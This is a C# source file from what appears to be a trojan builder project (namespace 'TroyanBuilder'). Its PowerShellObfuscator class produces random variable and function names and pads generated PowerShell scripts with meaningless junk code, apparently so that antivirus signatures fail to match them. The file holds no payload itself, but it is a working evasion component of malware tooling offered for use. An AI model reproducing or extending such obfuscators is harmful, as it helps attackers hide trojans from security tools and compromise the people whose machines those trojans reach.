using System.Management.Automation.Language;

namespace TroyanBuilder;

public partial class PowerShellObfuscator
{
    private static  readonly Random Random = new();
    private static  readonly HashSet<string> GeneratedNames = new();
    
    internal static string GenerateRandomName()
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        string randomName;

        do
        {
            var len = Random.Shared.Next(17, 23);
            randomName = new string(Enumerable.Repeat(chars, len).Select(s => s[Random.Next(s.Length)]).ToArray());
        } 
        while (GeneratedNames.Contains(randomName));

        GeneratedNames.Add(randomName);

        return randomName;
    }

    public string RandomCode()
    {
        if (!Program.RandomCode)
            return "";
        string varName = GenerateRandomName();
        string varValue = GenerateRandomName();
        string funcName = GenerateRandomName();

        string code = Environment.NewLine + $@"
$Global:{varName} = '{varValue}'
$Global:{varName}_c = '{varName}'

${varName} = '{varValue}'

function {funcName} {{
    param($param)
}}

for ($i = 0; $i -lt 3; $i++) {{
    if ($i -eq 1) {{
     {funcName} -param ${varName}
    }} else {{
      {funcName} -param ${varName}
    }}
    {funcName} -param ${varName}
}}

" + Environment.NewLine;

        code = code.Replace("'", "\"");
        
        return code;
    }

}